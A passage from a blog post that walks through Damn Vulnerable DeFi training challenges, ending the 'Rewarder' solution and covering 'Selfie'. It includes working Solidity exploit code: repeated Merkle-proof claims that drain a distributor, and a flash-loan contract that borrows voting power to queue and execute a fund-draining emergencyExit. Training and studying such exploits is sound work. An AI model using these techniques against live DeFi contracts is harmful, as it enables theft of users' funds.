    Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &quot;/test/the-rewarder/weth-distribution.json&quot;))), (Reward[]));
    uint256 wethIndex;
    uint256 wethAmount;
    for (uint256 i = 0; i &lt; wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            wethIndex = i;
            console.log(&quot;player = &quot;, wethRewards[i].beneficiary);
            wethAmount = wethRewards[i].amount;
            break;
        }
    }
    require(wethAmount &gt; 0, &quot;Player not in WETH list&quot;);

    // Step 3: create proof for each token
    bytes32[] memory dvtLeaves = _loadRewards(&quot;/test/the-rewarder/dvt-distribution.json&quot;);
    bytes32[] memory wethLeaves = _loadRewards(&quot;/test/the-rewarder/weth-distribution.json&quot;);

    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, dvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, wethIndex);

    // Step 4: create tokensToClaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Step 5: calculate how many duplicated claims requires
    uint256 dvtRemaining = distributor.getRemaining(address(dvt));
    uint256 wethRemaining = distributor.getRemaining(address(weth));
    uint256 dvtN = dvtRemaining / dvtAmount; 
    uint256 wethN = wethRemaining / wethAmount;

    // Step 6: create array for duplicated claim
    Claim[] memory claims = new Claim[](dvtN + wethN);
    for (uint256 i = 0; i &lt; dvtN; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtAmount,
            tokenIndex: 0,
            proof: dvtProof
        });
    }
    for (uint256 i = 0; i &lt; wethN; i++) {
        claims[dvtN + i] = Claim({
            batchNumber: 0,
            amount: wethAmount,
            tokenIndex: 1,
            proof: wethProof
        });
    }

    // Step 7: trigger the vulnerability
    distributor.claimRewards(claims, tokensToClaim);

    // Step 8: transfer every tokens to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}</code></pre>
<h2 id="6-Selfie-believe-or-not-I-am-your-governor"><a href="#6-Selfie-believe-or-not-I-am-your-governor" class="headerlink" title="6. Selfie: believe or not, I am your governor!"></a>6. Selfie: believe or not, I am your governor!</h2><h3 id="Challenge-Explanation-5"><a href="#Challenge-Explanation-5" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>We&#x2019;re back again with a flash loan challenge!  </p>
<p>The <code>SelfiePool.flashLoan()</code> function works as follows:  </p>
<p>&#x2192; Lends <code>_amount</code><br>&#x2192; Calls the <code>onFlashLoan()</code> function defined in the <code>_receiver</code> contract<br>&#x2192; Expects the loaned <code>_amount</code> to be repaid in full  </p>
<p>At first glance, it looks fairly straightforward. However, what really stands out here is the presence of a contract called <code>SimpleGovernance</code>.  </p>
<pre><code class="hljs solidity">contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
	  // ....
    
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }
    
	  // ....
    
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}</code></pre>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/@dkopolovets/smart-contract-governance-56852c90d3c2">Governance</a> refers to a decision-making body composed of users of a smart contract, typically called a <strong>DAO</strong> (<strong>D</strong>ecentralized <strong>A</strong>utonomous <strong>O</strong>rganization).  </p>
<p>DAOs that utilize a given smart contract generally hold voting rights and conduct votes. The DAO members with the majority of voting power gain access to certain administrator-level functions or variables within the smart contract.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image7.png" srcset="/img/loading.gif" alt>  </p>
<p>In most cases, these voting rights are determined by the number of governance tokens issued by the smart contract that a member holds.  </p>
<p>In the case of this challenge&#x2019;s <code>SimpleGovernance</code> contract, the function <code>_hasEnoughVotes()</code> ensures that only those who hold more than half of the total voting tokens (<code>_votingToken</code>) can call <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/selfie/SimpleGovernance.sol#L23">SimpleGovernance.queueAction()</a>.  </p>
<pre><code class="hljs solidity">contract SimpleGovernance is ISimpleGovernance {
		// ....
		
    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }
    
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
    
    // ....
   
     function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance &gt; halfTotalSupply;
    }
}</code></pre>
<p>The important point here is that in the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/selfie/Selfie.t.sol#L32">SelfieChallenge.setUp()</a> function, the token used as the loanable asset for the <code>SelfiePool</code> is the <strong>same</strong> token, <code>DamnValuableVotes</code>, that is also used as the governance voting token.  </p>
<pre><code class="hljs solidity">function setUp() public {
    // ....

    // Deploy token
    token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = new SimpleGovernance(token);

    // Deploy pool
    pool = new SelfiePool(token, governance);

    // ....</code></pre>
<h3 id="Challenge-Solving-5"><a href="#Challenge-Solving-5" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>Since the token used for loans and the token used for voting are the same, borrowing a large amount of tokens via <code>SelfiePool.flashLoan()</code> temporarily grants us <strong>the same amount of voting power</strong>. While holding these borrowed tokens, we gain the ability to call <code>SimpleGovernance.queueAction()</code>.  </p>
<p>The <code>queueAction()</code> function allows us to schedule a specific function call (an Action) into the governance queue. We can leverage this by scheduling a call to the <code>emergencyExit()</code> function, which withdraws all funds from the <code>SelfiePool</code>.  </p>
<pre><code class="hljs solidity">// SimpleGovernance.queueAction
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    // ....

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    // ....
}

// SimpleGovernance.executeAction
function executeAction(uint256 actionId) external payable returns (bytes memory) {
	  // _canBeExecuted: requires 2 days delay after queueAction execute
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}

// SelfiePool.emergencyExit
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}</code></pre>
<p>The <code>SimpleGovernance.executeAction()</code> function is responsible for executing an action that has been queued. For security, it enforces a time delay by checking the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L87">SimpleGovernance._canBeExecuted()</a> function. This requires that <strong>at least 2 days</strong> ( = <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L12">ACTION_DELAY_IN_SECONDS</a>) have passed since the <code>queueAction()</code> call before the action can be executed.  </p>
<p>In the testing environment, of course, we can bypass this by using the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://getfoundry.sh/reference/cheatcodes/warp.html">vm.warp()</a> function to modify the <code>block.timestamp</code> value.  </p>
<p>Based on the analysis so far, the attack flow can be summarized as follows:  </p>
<ol>
<li>Call <code>SelfiePool.flashLoan()</code> to borrow tokens without collateral and gain massive voting power.  </li>
<li>From within the <code>onFlashLoan()</code> callback, call <code>SimpleGovernance.queueAction()</code> to insert a call to <code>SelfiePool.emergencyExit()</code> into the <code>_actions</code> array.  </li>
<li>Use <code>vm.warp()</code> to advance the <code>block.timestamp</code> by at least 2 days.  </li>
<li>Call <code>SimpleGovernance.executeAction()</code> to execute the queued action.  </li>
</ol>
<pre><code class="hljs solidity">    function test_selfie() public checkSolvedByPlayer {
        SelfieSolver solver = new SelfieSolver(pool, governance, token, recovery);
        solver.solve();
        vm.warp(block.timestamp + 2 days);
        solver.execute();
    }
  
// ....

contract SelfieSolver is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;
    uint256 actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function solve() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, &quot;&quot;);
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // delegate voting 
        token.delegate(address(this));

        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(address(pool), amount);

        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}</code></pre>
<h2 id="Next-To-Do"><a href="#Next-To-Do" class="headerlink" title="Next To Do"></a>Next To Do</h2><p>That&#x2019;s it for PART 1!</p>
<p>Challenges 6&#x2013;12 will be covered in PART 2, and Challenges 13&#x2013;18 will be addressed in PART 3. Writing this document wasn&#x2019;t easy, as I&#x2019;m still learning myself and had to rely on my limited knowledge. But in PART 2, I&#x2019;ll do my best to dive deeper into each topic and provide more thorough explanations.  </p>
<p>Thank you!</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.damnvulnerabledefi.xyz/">https://www.damnvulnerabledefi.xyz/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0">https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/">https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/">https://docs.openzeppelin.com/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://eips.ethereum.org/erc">https://eips.ethereum.org/erc</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/d4tura/">d4tura</a>
                  
                  <a class="hover-with-bg" href="/tags/SmartContract/">SmartContract</a>
                  
                  <a class="hover-with-bg" href="/tags/DeFi/">DeFi</a>
                  
                  <a class="hover-with-bg" href="/tags/Blockchain/">Blockchain</a>
                  
                  <a class="hover-with-bg" href="/tags/Solidity/">Solidity</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_d4tura.jpg" srcset="/img/loading.gif" alt="d4tura">
                  </div>

                  <div class="link-text">
                    <div class="link-title">d4tura</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/d4tura">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2025/09/10/OUYA77/2025-09-10/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[하루한줄] CVE-2025-54878: NASA CryptoLib의 Heap Buffer Overflow로 인한 서비스 거부(DoS)</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2025/09/07/d4tura/smartcontracts/ko/">
                    <span class="hidden-mobile">[Research] smart contracts auditing 101 for pwners - PART 1 (KR)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2025/09/07/d4tura/smartcontracts/en/';
        this.page.identifier = '/2025/09/07/d4tura/smartcontracts/en/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] smart contracts auditing 101 for pwners - PART 1 (EN)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
